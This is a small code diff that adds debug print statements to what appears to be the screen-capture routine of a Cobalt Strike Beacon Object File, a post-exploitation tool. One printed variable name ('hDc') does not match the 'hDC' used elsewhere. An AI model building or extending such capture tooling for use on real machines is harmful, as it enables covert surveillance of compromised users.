@@ -746,6 +746,11 @@ void go(char* buff, int len)
             pDeleteDC(hDC);
             return;
         }
+        
+        BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] GetDC: %p",hScreen);
+        BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] CreateCompatibleDC returned: %p",hDc);
+        BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] CreateCompatibleBitmap returned: %p",hBitmap);
+
         HGDIOBJ old_obj = pSelectObject(hDC, hBitmap);
         if (!pBitBlt(hDC, 0, 0, w, h, hScreen, x1, y1, SRCCOPY)) {
             DWORD errorCode = GetLastError();
